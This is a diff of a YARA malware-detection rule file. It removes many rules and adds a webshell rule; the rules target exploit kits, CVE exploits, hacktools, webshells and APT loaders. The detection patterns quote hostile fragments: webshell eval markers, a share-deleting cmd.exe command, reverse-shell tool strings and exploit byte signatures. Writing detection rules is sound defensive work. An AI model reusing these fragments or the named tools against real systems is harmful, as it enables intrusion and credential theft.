-        $pay24 = "NTLMHash.exe" wide ascii
-        $pay25 = "wpnpinst.exe" wide ascii
-        $pay26 = "WSDbg.exe" wide ascii
-        $pay27 = "xcmd.exe" wide ascii
-        $pay28 = "adobeup.exe" wide ascii
-        $pay29 = "0830.bin" wide ascii
-        $pay30 = "1001.bin" wide ascii
-        $pay31 = "a.bin" wide ascii
-        $pay32 = "ISUN32.EXE" wide ascii
-        $pay33 = "AcroRD32.EXE" wide ascii
-        $pay34 = "INETINFO.EXE" wide ascii
-
-    condition:
-        1 of them
 }
 
 rule APT1_aspnetreport
@@ -9418,23 +14826,6 @@ rule potential_CVE_2017_11882
         $docfilemagic at 0 and any of ($mshta, $http, $https, $cmd, $pwsh, $exe) and any of ($equation1, $equation2) and $address
 }
 
-rule rtf_cve2017_11882_ole : malicious exploit cve_2017_11882 {
-    meta:
-        author = "John Davison"
-        description = "Attempts to identify the exploit CVE 2017 11882"
-        reference = "https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about"
-        sample = "51cf2a6c0c1a29abca9fd13cb22421da"
-        score = 60
-        //file_name = "re:^stream_[0-9]+_[0-9]+.dat$"
-    strings:
-        $headers = { 1c 00 00 00 02 00 ?? ?? a9 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 03 01 01 03 ?? }
-        $font = { 0a 01 08 5a 5a } // <-- I think that 5a 5a is the trigger for the buffer overflow
-        //$code = /[\x01-\x7F]{44}/
-        $winexec = { 12 0c 43 00 }
-    condition:
-        all of them and @font > @headers and @winexec == @font + 5 + 44
-}
-
 rule rtf_cve2017_11882 : malicious exploit cve_2017_1182 {
     meta:
         author = "John Davison"
@@ -9548,143 +14939,6 @@ rule CVE_2012_0158_KeyBoy {
       all of them
 }
 
-rule phoenix_html8 : EK
-{
-meta:
-   author = "Josh Berry"
-   date = "2016-06-26"
-   description = "Phoenix Exploit Kit Detection"
-   hash0 = "1c19a863fc4f8b13c0c7eb5e231bc3d1"
-   sample_filetype = "js-html"
-   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
-strings:
-   $string0 = "0x5)).replace(/"
-   $string1 = "%A%%A%%nc(,145,9,84037,1711,,4121,56,1,,0505,,651,,3,514101,01,29,7868,90"
-   $string2 = "/gmi,String.fromCharCode(2"
-   $string3 = "turt;oo)s"
-   $string4 = "91;var jtdpar"
-   $string5 = "R(,13,7,63,48140601,5057,,319,,6,1,1,2,,110,0,1011171,2319,,,,10vEAs)tfmneyeh%A%%A%%A%%A%s<u91,4693,"
-   $string6 = "y%%A%%A%%A%%A.meo21117,7,1,,10,1,9,8,1,9,100,6,141003,74181,163,441114,43,207,,remc'ut"
-   $string7 = "epjtjqe){jtdpar"
-   $string8 = "/gmi,'"
-   $string9 = "<font></font><body id"
-   $string10 = " epjtjqe; fqczi > 0; fqczi--){for (bwjmgl7 "
-   $string11 = "nbte)bb(egs%A%%A%%A%%A%%m"
-   $string12 = "fvC9614165,,,1,1801151030,,0,,487641114,,1,141,914810036,,888,201te.)'etdc:ysaA%%A%%A%%A%%5sao,61,0,"
-   $string13 = "(tiAmrd{/tnA%%A%%A%%A%%Aiin11,,1637,34191,626958314,11007,,61145,411,7,9,1821,,43,8311,26;d'ebt.dyvs"
-   $string14 = "A%%A%%A%%Ao"
-   $string15 = "hrksywd(cpkwisk4);/"
-   $string16 = ";</script>"
-condition:
-   16 of them
-}
-rule phoenix_html9 : EK
-{
-meta:
-   author = "Josh Berry"
-   date = "2016-06-26"
-   description = "Phoenix Exploit Kit Detection"
-   hash0 = "742d012b9df0c27ed6ccf3b234db20db"
-   sample_filetype = "js-html"
-   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
-strings:
-   $string0 = "tute)bbr:"
-   $string1 = "nfho(tghRx"
-   $string2 = "()irfE/Rt..cOcC"
-   $string3 = "NcEnevbf"
-   $string4 = "63FB8B4296BBC290A0.'0000079'Fh20216B6A6arA;<"
-   $string5 = "wHe(cLnyeyet(a.i,r.{.."
-   $string6 = "tute)bbdfiiix'bcr"
-   $string7 = "itifdf)d1L2f'asau%d004u%8e00u%0419u%a58du%2093u%ec10u%0050u%00d4u%4622u%bcd1u%b1ceu%5000u%f7f5u%5606"
-   $string8 = "2F4693529783'82F076676C38'te"
-   $string9 = "sm(teoeoi)cfh))pihnipeeeo}.,(.(("
-   $string10 = "ao)ntavlll{))ynlcoix}hiN.il'tes1ad)bm;"
-   $string11 = "i)}m0f(eClei(/te"
-   $string12 = "}aetsc"
-   $string13 = "irefnig.pT"
-   $string14 = "a0mrIif/tbne,(wsk,"
-   $string15 = "500F14B06000000630E6B72636F60632C6E711C6E762E646F147F44767F650A0804061901020009006B120005A2006L"
-   $string16 = ".hB.Csf)ddeSs"
-   $string17 = "tnne,IPd4Le"
-   $string18 = "hMdarc'nBtpw"
-condition:
-   18 of them
-}
-rule phoenix_jar : EK
-{
-meta:
-   author = "Josh Berry"
-   date = "2016-06-26"
-   description = "Phoenix Exploit Kit Detection"
-   hash0 = "a8a18219b02d30f44799415ff19c518e"
-   sample_filetype = "unknown"
-   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
-strings:
-   $string0 = "r.JM,IM"
-   $string1 = "qX$8$a"
-   $string2 = "META-INF/services/javax.sound.midi.spi.MidiDeviceProvider5"
-   $string3 = "a.classPK"
-   $string4 = "6;\\Q]Q"
-   $string5 = "h[s] X"
-   $string6 = "ToolsDemoSubClass.classPK"
-   $string7 = "a.class"
-   $string8 = "META-INF/MANIFEST.MFPK"
-   $string9 = "ToolsDemoSubClass.classeO"
-   $string10 = "META-INF/services/javax.sound.midi.spi.MidiDeviceProviderPK"
-condition:
-   10 of them
-}
-rule phoenix_jar2 : EK
-{
-meta:
-   author = "Josh Berry"
-   date = "2016-06-26"
-   description = "Phoenix Exploit Kit Detection"
-   hash0 = "989c5b5eaddf48010e62343d7a4db6f4"
-   sample_filetype = "unknown"
-   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
-strings:
-   $string0 = "a66d578f084.classeQ"
-   $string1 = "a4cb9b1a8a5.class"
-   $string2 = ")szNu\\MutK"
-   $string3 = "qCCwBU"
-   $string4 = "META-INF/MANIFEST.MF"
-   $string5 = "QR,GOX"
-   $string6 = "ab5601d4848.classmT"
-   $string7 = "a6a7a760c0e["
-   $string8 = "2ZUK[L"
-   $string9 = "2VT(Au5"
-   $string10 = "a6a7a760c0ePK"
-   $string11 = "aa79d1019d8.class"
-   $string12 = "aa79d1019d8.classPK"
-   $string13 = "META-INF/MANIFEST.MFPK"
-   $string14 = "ab5601d4848.classPK"
-condition:
-   14 of them
-}
-rule phoenix_jar3 : EK Jar
-{
-meta:
-   author = "Josh Berry"
-   date = "2016-06-26"
-   description = "Phoenix Exploit Kit Detection"
-   hash0 = "c5655c496949f8071e41ea9ac011cab2"
-   sample_filetype = "unknown"
-   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
-strings:
-   $string0 = "'> >$>"
-   $string1 = "bpac/PK"
-   $string2 = "bpac/purok$1.classmP]K"
-   $string3 = "bpac/KAVS.classmQ"
-   $string4 = "'n n$n"
-   $string5 = "bpac/purok$1.classPK"
-   $string6 = "$.4aX,Gt<"
-   $string7 = "bpac/KAVS.classPK"
-   $string8 = "bpac/b.classPK"
-   $string9 = "bpac/b.class"
-condition:
-   9 of them
-}
 rule phoenix_pdf : EK PDF
 {
 meta:
@@ -9710,155 +14964,6 @@ strings:
    $string11 = "0000000010 00000 n"
 condition:
    11 of them
-}
-rule phoenix_pdf2 : EK PDF
-{
-meta:
-   author = "Josh Berry"
-   date = "2016-06-26"
-   description = "Phoenix Exploit Kit Detection"
-   hash0 = "33cb6c67f58609aa853e80f718ab106a"
-   sample_filetype = "pdf"
-   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
-strings:
-   $string0 = "\\nQb<%"
-   $string1 = "0000000254 00000 n"
-   $string2 = ":S3>v0$EF"
-   $string3 = "trailer<</Root 1 0 R /Size 7>>"
-   $string4 = "%PDF-1.0"
-   $string5 = "0000000000 65535 f"
-   $string6 = "endstream"
-   $string7 = "0000000010 00000 n"
-   $string8 = "6 0 obj<</JS 7 0 R/S/JavaScript>>endobj"
-   $string9 = "3 0 obj<</JavaScript 5 0 R >>endobj"
-   $string10 = "}pr2IE"
-   $string11 = "0000000157 00000 n"
-   $string12 = "1 0 obj<</Type/Catalog/Pages 2 0 R /Names 3 0 R >>endobj"
-   $string13 = "5 0 obj<</Names[("
-condition:
-   13 of them
-}
-
-rule phoenix_pdf : EK PDF
-{
-meta:
-   author = "Josh Berry"
-   date = "2016-06-26"
-   description = "Phoenix Exploit Kit Detection"
-   hash0 = "16de68e66cab08d642a669bf377368da"
-   hash1 = "bab281fe0cf3a16a396550b15d9167d5"
-   sample_filetype = "pdf"
-   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
-strings:
-   $string0 = "0000000254 00000 n"
-   $string1 = "0000000295 00000 n"
-   $string2 = "trailer<</Root 1 0 R /Size 7>>"
-   $string3 = "0000000000 65535 f"
-   $string4 = "3 0 obj<</JavaScript 5 0 R >>endobj"
-   $string5 = "0000000120 00000 n"
-   $string6 = "%PDF-1.0"
-   $string7 = "startxref"
-   $string8 = "0000000068 00000 n"
-   $string9 = "endobjxref"
-   $string10 = ")6 0 R ]>>endobj"
-   $string11 = "0000000010 00000 n"
-condition:
-   11 of them
-}
-
-rule zeroaccess_htm : EK html
-{
-meta:
-   author = "Josh Berry"
-   date = "2016-06-27"
-   description = "ZeroAccess Exploit Kit Detection"
-   hash0 = "0e7d72749b60c8f05d4ff40da7e0e937"
-   sample_filetype = "js-html"
-   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
-strings:
-   $string0 = "screen.height:"
-   $string1 = "</script></head><body onload"
-   $string2 = "Fx0ZAQRKXUVgbh0qNDRJVxYwGg4tGh8aHQoAVQQSNyo0NElXFjAaDi0NFQYESl1FBBNnTFoSPiBmADwnPTQxPSdKWUUEE2UcGR0z"
-   $string3 = "0);-10<b"
-   $string4 = "function fl(){var a"
-   $string5 = "0);else if(navigator.mimeTypes"
-   $string6 = ");b.href"
-   $string7 = "/presults.jsp"
-   $string8 = "128.164.107.221"
-   $string9 = ")[0].clientWidth"
-   $string10 = "presults.jsp"
-   $string11 = ":escape(c),e"
-   $string12 = "navigator.plugins.length)navigator.plugins["
-   $string13 = "window;d"
-   $string14 = "gr(),j"
-   $string15 = "VIEWPORT"
-   $string16 = "FQV2D0ZAH1VGDxgZVg9COwYCAwkcTzAcBxscBFoKAAMHUFVuWF5EVVYVdVtUR18bA1QdAU8HQjgeUFYeAEZ4SBEcEk1FTxsdUlVA"
-condition:
-   16 of them
-}
-rule zeroaccess_js : EK js
-{
-meta:
-   author = "Josh Berry"
-   date = "2016-06-27"
-   description = "ZeroAccess Exploit Kit Detection"
-   hash0 = "a9f30483a197cfdc65b4a70b8eb738ab"
-   sample_filetype = "js-html"
-   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
-strings:
-   $string0 = "Square ad tag  (tile"
-   $string1 = "  adRandNum "
-   $string2 = " cellspacing"
-   $string3 = "\\n//-->\\n</script>"
-   $string4 = "format"
-   $string5 = "//-->' "
-   $string6 = "2287974446"
-   $string7 = "NoScrBeg "
-   $string8 = "-- start adblade -->' "
-   $string9 = "3427054556"
-   $string10 = "        while (i >"
-   $string11 = "return '<table width"
-   $string12 = "</scr' "
-   $string13 = " s.substring(0, i"
-   $string14 = " /></a></noscript>' "
-   $string15 = "    else { isEmail "
-   $string16 = ").submit();"
-   $string17 = " border"
-   $string18 = "pub-8301011321395982"
-condition:
-   18 of them
-}
-rule zeroaccess_js2 : EK js
-{
-meta:
-   author = "Josh Berry"
-   date = "2016-06-27"
-   description = "ZeroAccess Exploit Kit Detection"
-   hash0 = "b5fda04856b98c254d33548cc1c1216c"
-   sample_filetype = "js-html"
-   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
-strings:
-   $string0 = "ApiClientConfig"
-   $string1 = "function/.test(pa.toString())"
-   $string2 = "background-image:url(http:\\/\\/static.ak.fbcdn.net\\/rsrc.php\\/v2\\/y6\\/x\\/s816eWC-2sl.gif)}"
-   $string3 = "Music.init"
-   $string4 = "',header:'bool',recommendations:'bool',site:'hostname'},create_event_button:{},degrees:{href:'url'},"
-   $string5 = "cca6477272fc5cb805f85a84f20fca1d"
-   $string6 = "document.createElement('form');c.action"
-   $string7 = "javascript:false"
-   $string8 = "s.onMessage){j.error('An instance without whenReady or onMessage makes no sense');throw new Error('A"
-   $string9 = "NaN;}else h"
-   $string10 = "sprintf"
-   $string11 = "window,j"
-   $string12 = "o.getUserID(),da"
-   $string13 = "FB.Runtime.getLoginStatus();if(b"
-   $string14 = ")');k.toString"
-   $string15 = "rovide('XFBML.Send',{Dimensions:{width:80,height:25}});"
-   $string16 = "{log:i};e.exports"
-   $string17 = "a;FB.api('/fql','GET',f,function(g){if(g.error){ES5(ES5('Object','keys',false,b),'forEach',true,func"
-   $string18 = "true;}}var ia"
-condition:
-   18 of them
 }
 
 rule generic_javascript_obfuscation
@@ -10006,22 +15111,6 @@ rule wiper_encoded_strings
 
 	condition:
 		$scr or $explorer or $kernel32 
-}
-
-rule SierraBravo_packed
-{
-	meta:
-		copyright = "2015 Novetta Solutions"
-		author = "Novetta Threat Research & Interdiction Group - trig@novetta.com"
-
-	strings:
-		$ = "cmd.exe /c \"net share admin$ /d\""
-		$ = "MAIL FROM:<"
-		$ = ".petite"
-		$ = "Subject: %s|%s|%s"
-	condition:
-		3 of them
-	
 }
 
 rule UniformJuliett
@@ -10282,119 +15371,6 @@ rule EXT_HKTL_MAL_TinyShell_Backdoor_SPARC {
       uint32(0) == 0x464C457F and (uint16(0x10) & 0x0200 == 0x0200) and (uint16(0x12) & 0x0200 == 0x0200) and 1 of them
 }
 
-rule hacktool_multi_ntlmrelayx
-{
-    meta:
-        description = "https://www.fox-it.com/en/insights/blogs/blog/inside-windows-network/"
-        reference = "https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py"
-        author = "@mimeframe"
-    strings:
-        $a1 = "Started interactive SMB client shell via TCP" wide ascii
-        $a2 = "Service Installed.. CONNECT!" wide ascii
-        $a3 = "Done dumping SAM hashes for host:" wide ascii
-        $a4 = "DA already added. Refusing to add another" wide ascii
-        $a5 = "Domain info dumped into lootdir!" wide ascii
-    condition:
-        any of ($a*)
-}
-
-rule hacktool_multi_pyrasite_py
-{
-    meta:
-        description = "A tool for injecting arbitrary code into running Python processes."
-        reference = "https://github.com/lmacken/pyrasite"
-        author = "@fusionrace"
-    strings:
-        $s1 = "WARNING: ptrace is disabled. Injection will not work." fullword ascii wide
-        $s2 = "A payload that connects to a given host:port and receives commands" fullword ascii wide
-        $s3 = "A reverse Python connection payload." fullword ascii wide
-        $s4 = "pyrasite - inject code into a running python process" fullword ascii wide
-        $s5 = "The ID of the process to inject code into" fullword ascii wide
-        $s6 = "This file is part of pyrasite." fullword ascii wide
-        $s7 = "https://github.com/lmacken/pyrasite" fullword ascii wide
-        $s8 = "Setup a communication socket with the process by injecting" fullword ascii wide
-        $s9 = "a reverse subshell and having it connect back to us." fullword ascii wide
-        $s10 = "Write out a reverse python connection payload with a custom port" fullword ascii wide
-        $s11 = "Wait for the injected payload to connect back to us" fullword ascii wide
-        $s12 = "PyrasiteIPC" fullword ascii wide
-        $s13 = "A reverse Python shell that behaves like Python interactive interpreter." fullword ascii wide
-        $s14 = "pyrasite cannot establish reverse" fullword ascii wide
-    condition:
-        any of them
-}
-
-rule hacktool_windows_moyix_creddump
-{
-    meta:
-        description = "creddump is a python tool to extract credentials and secrets from Windows registry hives."
-        reference = "https://github.com/moyix/creddump"
-        author = "@mimeframe"
-    strings:
-        $a1 = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%" wide ascii
-        $a2 = "0123456789012345678901234567890123456789" wide ascii
-        $a3 = "NTPASSWORD" wide ascii
-        $a4 = "LMPASSWORD" wide ascii
-        $a5 = "aad3b435b51404eeaad3b435b51404ee" wide ascii
-        $a6 = "31d6cfe0d16ae931b73c59d7e0c089c0" wide ascii
-    condition:
-        all of ($a*)
-}
-
-rule hacktool_windows_ncc_wmicmd : FILE {
-    meta:
-        description = "Command shell wrapper for WMI"
-        reference = "https://github.com/nccgroup/WMIcmd"
-        author = "@mimeframe"
-    strings:
-        $a1 = "Need to specify a username, domain and password for non local connections" wide ascii
-        $a2 = "WS-Management is running on the remote host" wide ascii
-        $a3 = "firewall (if enabled) allows connections" wide ascii
-        $a4 = "WARNING: Didn't see stdout output finished marker - output may be truncated" wide ascii
-        $a5 = "Command sleep in milliseconds - increase if getting truncated output" wide ascii
-        $b1 = "0x800706BA" wide ascii
-        $b2 = "NTLMDOMAIN:" wide ascii
-        $b3 = "cimv2" wide ascii
-    condition:
-        any of ($a*) or all of ($b*)
-}
-
-rule hacktool_windows_rdp_cmd_delivery
-{
-    meta:
-        description = "Delivers a text payload via RDP (rubber ducky)"
-        reference = "https://github.com/nopernik/mytools/blob/master/rdp-cmd-delivery.sh"
-        author = "@fusionrace"
-    strings:
-        $s1 = "Usage: rdp-cmd-delivery.sh OPTIONS" ascii wide
-        $s2 = "[--tofile 'c:\\test.txt' local.ps1 #will copy contents of local.ps1 to c:\\test.txt" ascii wide
-        $s3 = "-cmdfile local.bat                #will execute everything from local.bat" ascii wide
-        $s4 = "To deliver powershell payload, use '--cmdfile script.ps1' but inside powershell console" ascii wide
-    condition:
-        any of them
-}
-
-rule hacktool_windows_wmi_implant
-{
-    meta:
-        description = "A PowerShell based tool that is designed to act like a RAT"
-        reference = "https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html"
-        author = "@fusionrace"
-    strings:
-        $s1 = "This really isn't applicable unless you are using WMImplant interactively." fullword ascii wide
-        $s2 = "What command do you want to run on the remote system? >" fullword ascii wide
-        $s3 = "Do you want to [create] or [delete] a string registry value? >" fullword ascii wide
-        $s4 = "Do you want to run a WMImplant against a list of computers from a file? [yes] or [no] >" fullword ascii wide
-        $s5 = "What is the name of the service you are targeting? >" fullword ascii wide
-        $s6 = "This function enables the user to upload or download files to/from the attacking machine to/from the targeted machine" fullword ascii wide
-        $s7 = "gen_cli - Generate the CLI command to execute a command via WMImplant" fullword ascii wide
-        $s8 = "exit - Exit WMImplant" fullword ascii wide
-        $s9 = "Lateral Movement Facilitation" fullword ascii wide
-        $s10 = "vacant_system - Determine if a user is away from the system." fullword ascii wide
-        $s11 = "Please provide the ProcessID or ProcessName flag to specify the process to kill!" fullword ascii wide
-    condition:
-        any of them
-}
-
 rule gen_excel_auto_open_evasion
 {
     meta:
@@ -10513,44 +15489,6 @@ rule SUSP_MacOS_Plist_Suspicious {
       and not 1 of ($fp*)
 }
 
-rule APT_PY_BlueLight_Loader : InkySquid
-{
-    meta:
-        author = "threatintel@volexity.com"
-        description = "Python Loader used to execute the BLUELIGHT malware family."
-        date = "2021-06-22"
-        hash1 = "80269413be6ad51b8b19631b2f5559c9572842e789bbce031babe6e879d2e120"
-        license = "See license at https://github.com/volexity/threat-intel/LICENSE.txt"
-        reference = "https://www.volexity.com/blog/2021/08/24/north-korean-bluelight-special-inkysquid-deploys-rokrat/"
-        id = "f8da3e40-c3b0-5b7f-8ece-81874993d8cd"
-    strings:
-        $s1 = "\"\".join(chr(ord(" ascii
-        $s2 = "import ctypes " ascii
-        $s3 = "ctypes.CFUNCTYPE(ctypes.c_int)" ascii
-        $s4 = "ctypes.memmove" ascii
-        $s5 = "python ended" ascii
-
-    condition:
-        all of them
-}
-
-rule APT_MAL_Win_RokLoad_Loader : InkySquid
-{
-    meta:
-        author = "threatintel@volexity.com"
-        date = "2021-06-23"
-        description = "A shellcode loader used to decrypt and run an embedded executable."
-        hash = "85cd5c3bb028fe6931130ccd5d0b0c535c01ce2bcda660a3b72581a1a5382904"
-        license = "See license at https://github.com/volexity/threat-intel/LICENSE.txt"
-        reference = "https://www.volexity.com/blog/2021/08/24/north-korean-bluelight-special-inkysquid-deploys-rokrat/"
-        id = "229dbf3c-1538-5ecd-b5f8-8c9a9c81c515"
-    strings:
-        $bytes00 = { 48 ?? ?? ?? ?? 48 ?? ?? ?? ?? 48 ?? ?? ?? ?? 57 41 54 41 55 41 56 41 57 48 ?? ?? ?? b9 ?? ?? ?? ?? 33 ff e8 ?? ?? ?? ?? b9 ?? ?? ?? ?? 4c 8b e8 e8 ?? ?? ?? ?? 4c 8b f0 41 ff d6 b9 ?? ?? ?? ?? 44 8b f8 e8 ?? ?? ?? ?? 4c 8b e0 e8 ?? ?? ?? ?? 48 }
-    
-    condition:
-        $bytes00 at 0
-}
-
 rule APT_NK_Scarcruft_RUBY_Shellcode_XOR_Routine {
      meta:
        author        = "S2WLAB_TALON_JACK2"
@@ -10582,29 +15520,6 @@ rule APT_NK_Scarcruft_RUBY_Shellcode_XOR_Routine {
          1 of them
  }
 
-rule SUSP_EXPL_LNX_CUPS_CVE_2024_47177_Sep24 {
-   meta:
-      description = "Detects suspicious FoomaticRIPCommandLine command in printer config, which could be used to exploit CUPS CVE-2024-47177"
-      author = "Florian Roth"
-      reference = "https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8"
-      date = "2024-09-27"
-      score = 65
-      id = "cb76f1c7-6dc0-5fed-a970-2a4890db46d3"
-   strings:
-      $ = "FoomaticRIPCommandLine: \"bash " ascii
-      $ = "FoomaticRIPCommandLine: \"sh " ascii
-      $ = "FoomaticRIPCommandLine: \"python " ascii
-      $ = "FoomaticRIPCommandLine: \"perl " ascii
-      $ = "FoomaticRIPCommandLine: \"echo " ascii
-      $ = "FoomaticRIPCommandLine: \\\"bash " ascii
-      $ = "FoomaticRIPCommandLine: \\\"sh " ascii
-      $ = "FoomaticRIPCommandLine: \\\"python " ascii
-      $ = "FoomaticRIPCommandLine: \\\"perl " ascii
-      $ = "FoomaticRIPCommandLine: \\\"echo " ascii
-   condition:
-      1 of them
-}
-
 rule EXT_MAL_SystemBC_Mar22_1 {
     meta:
         author = "Thomas Barabosch, Deutsche Telekom Security"
@@ -10630,27 +15545,6 @@ rule EXT_MAL_SystemBC_Mar22_1 {
         $s8 = "ALLUSERSPROFILE" ascii
     condition:
         ( uint16(0) == 0x5a4d and filesize < 30KB and 2 of ($sx*) ) or all of them
-}
-
-rule MAL_Fake_Document_Software_Indicators_Nov23 {
-   meta:
-      description = "Detects indicators of fake document/image utility software that acts as a downloader for additional malware"
-      author = "Jonathan Peters"
-      date = "2023-11-13"
-      reference = "https://nochlab.blogspot.com/2023/09/net-in-javascript-fake-pdf-converter.html"
-      hash1 = "ac5356ae011effb9d401bf428c92a48cf82c9b61f4c24a29a9718e3379f90f1d"
-      hash2 = "d1c29c2243c511ca3264ad568a6be62f374e104b903eca93debce6691e1c5007"
-      score = 80
-      id = "231474cd-1ec9-5738-bf48-ef707689056d"
-   strings:
-      $ = "tweakscode.com" wide
-      $ = "www.createmygif.com" wide
-      $ = "www.videownload.com" wide
-      $ = "www.pdfconverterz.com" wide
-      $ = "www.pdfconvertercompare.com" wide
-   condition:
-      uint16(0) == 0x5a4d
-      and 1 of them
 }
 
 rule WEBSHELL_JSP_Nov21_1 {
@@ -11024,34 +15918,6 @@ rule WEBSHELL_ASPX_ProxyShell_Aug15 {
       ( 1 of ($s*) or 4 of ($g*) )
 }
 
-rule WEBSHELL_Mailbox_Export_PST_ProxyShell_Aug26 {
-   meta:
-      description = "Webshells generated by an Mailbox export to PST and stored as aspx: 570221043.aspx 689193944.aspx luifdecggoqmansn.aspx"
-      author = "Moritz Oettle"
-      reference = "https://github.com/hvs-consulting/ioc_signatures/tree/main/Proxyshell"
-      date = "2021-09-04"
-      score = 85
-      id = "6aea414f-d27c-5202-84f8-b8620782fc90"
-   strings:
-      $x1 = "!BDN" /* PST file header */
-
-      $g1 = "Page language=" ascii
-      $g2 = "<%@ Page" ascii
-      $g3 = "Request.Item[" ascii
-      $g4 = "\"unsafe\");" ascii
-      $g5 = "<%eval(" ascii
-      $g6 = "script language=" ascii
-      $g7 = "Request[" ascii
-
-      $s1 = "gold8899" ascii /* HTTP Request Parameter */
-      $s2 = "exec_code" ascii /* HTTP Request Parameter */
-      $s3 = "orangenb" ascii /* HTTP Request Parameter */
-   condition:
-      filesize < 500KB and
-      $x1 at 0 and
-      ( 1 of ($s*) or 3 of ($g*) )
-}
-
 rule SUSP_IIS_Config_ProxyShell_Artifacts {
    meta:
       description = "Detects suspicious virtual directory configured in IIS pointing to a ProgramData folder (as found in attacks against Exchange servers in August 2021)"
@@ -11250,29 +16116,6 @@ rule SCT_Scriptlet_in_Temp_Inet_Files {
 		and filepath contains "Temporary Internet Files"
 }
 
-rule GIFCloaked_Webshell_A {
-   meta:
-      description = "Looks like a webshell cloaked as GIF"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      hash = "f1c95b13a71ca3629a0bb79601fcacf57cdfcf768806a71b26f2448f8c1d5d24"
-      score = 60
-      id = "4fdef65c-204a-5019-9b4f-c5877c3e39d4"
-   strings:
-      $s0 = "input type"
-      $s1 = "<%eval request"
-      $s2 = "<%eval(Request.Item["
-      $s3 = "LANGUAGE='VBScript'"
-      $s4 = "$_REQUEST" fullword
-      $s5 = ";eval("
-      $s6 = "base64_decode"
-
-      $fp1 = "<form name=\"social_form\""
-   condition:
-      uint32(0) == 0x38464947 and ( 1 of ($s*) )
-      and not 1 of ($fp*)
-}
-
 rule lsadump {
    meta:
       description      = "LSA dump programe (bootkey/syskey) - pwdump and others"
@@ -11301,70 +16144,6 @@ rule lsadump {
       and not filetype == "EXE"
       and not filepath contains "Dr Watson"
       and not extension == "vbs"
-}
-
-rule SUSP_Blocked_Download_Proxy_Replacement_Jan23_1 {
-   meta:
-      description = "Detects a file that has been replaced with a note by a security solution like an Antivirus or a filtering proxy server"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://www.virustotal.com/gui/search/filename%253A*.exe%2520tag%253Ahtml%2520size%253A10kb-%2520size%253A2kb%252B/files"
-      date = "2023-01-28"
-      score = 60
-      id = "58bc8288-6bdb-57d5-9de5-a54a39584838"
-   strings:
-      $x01 = "Web Filter Violation"
-      $x02 = "Google Drive can't scan this file for viruses."
-      $x03 = " target=\"_blank\">Cloudflare <img "
-      $x04 = "Sorry, this file is infected with a virus.</p>"
-      $x05 = "-- Sophos Warn FileType Page -->"
-      $x06 = "<p>Certain Sophos products may not be exported for use by government end-users" // accept EULA 
-      $x07 = "<p class=\"content-list\">Bitly displays this warning when a link has been flagged as suspect. There are many"
-      $x08 = "Something went wrong. Don't worry, your files are still safe and the Dropbox team has been notified."
-      $x09 = "<p>sinkhole</p>"
-      $x10 = "The requested short link is blocked by website administration due to violation of the website policy terms."
-      $x11 = "<img src=\"https://www.malwarebytes.com/images/"
-      $x12 = "<title>Malwarebytes</title>"
-      $x13 = "<title>Blocked by VIPRE</title>"
-      $x14 = "<title>Your request appears to be from an automated process</title>"
-      $x15 = "<p>Advanced Security blocked access to"
-      $x16 = "<title>Suspected phishing site | Cloudflare</title>"
-      $x17 = ">This link has been flagged "
-      $x18 = "<h1>Trend Micro Apex One</h1>"
-      $x19 = "Hitachi ID Identity and Access Management Suite"
-      $x20 = ">http://www.fortinet.com/ve?vn="
-      $x21 = "access to URL with fixed IP not allowed" // FritzBox
-      $x23 = "<title>Web Page Blocked</title>"
-      $x24 = "<title>Malicious Website Blocked</title>"
-      $x25 = "<h2>STOPzilla has detected"
-      $x26 = ">Seqrite Endpoint Security</span>"
-      $x27 = "<TITLE>K7 Safe Surf</TITLE>"
-      $x28 = "<title>Blocked by VIPRE</title>"
-
-      $g01 = "blocked access" fullword
-      $g02 = "policy violation" fullword
-      $g03 = "violation of " 
-      $g04 = "blocked by" fullword
-      $g05 = "Blocked by" fullword
-      $g07 = "Suspected Phishing"
-      $g08 = "ile quarantined"
-      $g09 = " is infected "
-      $g10 = "Blocked</title>"
-      $g11 = "site blocked" fullword
-      $g12 = "Site Blocked" fullword
-      $g13 = "blocked for" fullword
-      $g14 = "is blocked" fullword
-      $g15 = "potentially harmful"
-      $g16 = "Page Blocked" fullword
-      $g17 = "page blocked" fullword
-   condition:
-      extension == ".exe" and not uint16(0) == 0x5a4d and 1 of them
-      or (
-         extension == ".rar" or 
-         extension == ".ps1" or 
-         extension == ".vbs" or
-         extension == ".bat"
-      )
-      and 1 of ($x*)
 }
 
 rule SUSP_Password_XLS_Encrypted {
@@ -11405,6 +16184,362 @@ rule Servantshell {
       $string5 = "CheckDT"
    condition:
       uint16(0) == 0x5a4d and all of them
+}
+
+rule Weevely_Webshell {
+	meta:
+		description = "Weevely Webshell - Generic Rule - heavily scrambled tiny web shell"
+		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
+		author = "Florian Roth (Nextron Systems)"
+		reference = "http://www.ehacking.net/2014/12/weevely-php-stealth-web-backdoor-kali.html"
+		date = "2014/12/14"
+		score = 60
+		id = "12aa177a-4ebc-5ed8-a81b-34ec83395ec4"
+	strings:
+		$s0 = /\$[a-z]{4} = \$[a-z]{4}\("[a-z][a-z]?",[\s]?"",[\s]?"/ ascii
+		$s1 = /\$[a-z]{4} = str_replace\("[a-z][a-z]?","","/ ascii
+		$s2 = /\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\)\)\); \$[a-z]{4}\(\);/ ascii
+		$s4 = /\$[a-z]{4}="[a-zA-Z0-9]{70}/ ascii
+	condition:
